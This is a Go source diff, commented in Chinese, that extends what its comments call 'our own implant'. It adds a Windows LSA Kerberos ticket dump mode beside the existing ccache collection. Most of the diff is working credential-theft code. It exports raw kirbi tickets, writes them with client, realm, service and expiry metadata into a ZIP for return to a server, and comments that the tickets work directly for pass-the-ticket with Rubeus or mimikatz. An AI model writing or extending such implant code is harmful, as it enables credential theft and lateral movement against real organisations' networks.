@@ -33,6 +33,24 @@ const maxCCacheFileBytes = 4 << 20
 // maxCCacheFiles 单次采集上限（与服务端 cred.MaxTicketCaches 保持一致）
 const maxCCacheFiles = 64
 
+// lsaTicketEntry 清单里的 LSA 票据元数据。
+//
+// LSA 导出的是 **kirbi（KRB_CRED）**：它的 enc-part 需要密钥才能解，服务端拿到
+// 字节也无法还原客户端 principal —— 所以元数据由客户端随清单上报（客户端是
+// 我们自己的植入体），服务端只做形态校验与入库。
+type lsaTicketEntry struct {
+	File    string `json:"file"`
+	Client  string `json:"client,omitempty"`
+	Realm   string `json:"realm,omitempty"`
+	Server  string `json:"server"`
+	Start   string `json:"start,omitempty"`
+	End     string `json:"end,omitempty"`
+	Renew   string `json:"renew,omitempty"`
+	Flags   uint32 `json:"flags,omitempty"`
+	EncType int32  `json:"enc_type,omitempty"`
+	Size    int    `json:"size,omitempty"`
+}
+
 // ccacheManifest 制品清单（服务端只当真，不校验 —— 条目内容以解析结果为准）
 type ccacheManifest struct {
 	Host        string   `json:"host"`
@@ -43,6 +61,7 @@ type ccacheManifest struct {
 		Name string `json:"name"`
 		Size int64  `json:"size"`
 	} `json:"files"`
+	LSATickets []lsaTicketEntry `json:"lsa_tickets,omitempty"`
 }
 
 // findCCacheFiles 找出本机可读的 ccache 文件。
@@ -113,7 +132,13 @@ func findCCacheFiles() ([]string, []string) {
 }
 
 // credDumpTickets Kerberos 票据缓存：打包 ZIP → 异步回传
-func credDumpTickets(_tech, fileName string) ([]byte, error) {
+//
+// tech=files：本机 ccache 文件（任意平台）
+// tech=lsa  ：Windows LSA 凭据缓存（枚举 + 导出 kirbi，见 lsa_windows.go）
+func credDumpTickets(tech, fileName string) ([]byte, error) {
+	if tech == "lsa" {
+		return credDumpLSATickets(fileName)
+	}
 	files, notes := findCCacheFiles()
 	if len(files) == 0 {
 		msg := "未发现 Kerberos 票据缓存文件（krb5cc*）"
@@ -184,6 +209,91 @@ func writeTicketBundle(destPath string, files []string, notes []string) (int, er
 	if written == 0 {
 		_ = zw.Close()
 		return 0, errors.New("所有票据缓存文件都读取失败")
+	}
+
+	mb, err := zw.Create("manifest.json")
+	if err != nil {
+		return written, fmt.Errorf("写入清单失败: %w", err)
+	}
+	enc := json.NewEncoder(mb)
+	enc.SetIndent("", "  ")
+	if err := enc.Encode(manifest); err != nil {
+		return written, fmt.Errorf("序列化清单失败: %w", err)
+	}
+	if err := zw.Close(); err != nil {
+		return written, fmt.Errorf("关闭制品失败: %w", err)
+	}
+	return written, nil
+}
+
+// sanitizeTicketFile 把服务名（含 / 与 *）变成安全的 ZIP 内文件名。
+func sanitizeTicketFile(server string) string {
+	var b strings.Builder
+	for _, r := range server {
+		switch {
+		case r >= 'a' && r <= 'z', r >= 'A' && r <= 'Z', r >= '0' && r <= '9', r == '-', r == '_':
+			b.WriteRune(r)
+		default:
+			b.WriteByte('_')
+		}
+	}
+	if b.Len() == 0 {
+		return "ticket"
+	}
+	return b.String()
+}
+
+// writeLSATicketBundle 生成 LSA 票据制品：manifest.json（含 lsa_tickets 元数据）+
+// kirbi/<序号>-<服务名>.kirbi。
+//
+// kirbi 是原始 KRB_CRED，可直接用于 ptt（Rubeus / mimikatz kerberos::ptt）或
+// impacket 的 ticketConverter 转 ccache。
+func writeLSATicketBundle(destPath string, tickets []lsaTicket, errs []string) (int, error) {
+	out, err := os.OpenFile(destPath, os.O_CREATE|os.O_TRUNC|os.O_WRONLY, 0o600)
+	if err != nil {
+		return 0, fmt.Errorf("创建票据制品失败: %w", err)
+	}
+	defer out.Close()
+
+	zw := zip.NewWriter(out)
+	host, _ := os.Hostname()
+	manifest := ccacheManifest{
+		Host:        host,
+		User:        os.Getenv("USERNAME"),
+		CollectedAt: time.Now().Format("2006-01-02 15:04:05"),
+		Errors:      errs,
+	}
+
+	written := 0
+	for i, t := range tickets {
+		if len(t.KerbCred) == 0 {
+			continue
+		}
+		name := fmt.Sprintf("kirbi/%02d-%s.kirbi", i+1, sanitizeTicketFile(t.Server))
+		entry, err := zw.Create(name)
+		if err != nil {
+			return written, fmt.Errorf("写入票据条目失败: %w", err)
+		}
+		if _, err := entry.Write(t.KerbCred); err != nil {
+			return written, fmt.Errorf("写入票据内容失败: %w", err)
+		}
+		manifest.LSATickets = append(manifest.LSATickets, lsaTicketEntry{
+			File:    name,
+			Client:  t.Client,
+			Realm:   t.ClientRealm,
+			Server:  t.Server,
+			Start:   lsaTicketTime(t.Start),
+			End:     lsaTicketTime(t.End),
+			Renew:   lsaTicketTime(t.Renew),
+			Flags:   t.Flags,
+			EncType: t.EncType,
+			Size:    len(t.KerbCred),
+		})
+		written++
+	}
+	if written == 0 {
+		_ = zw.Close()
+		return 0, errors.New("所有票据导出结果都为空")
 	}
 
 	mb, err := zw.Create("manifest.json")
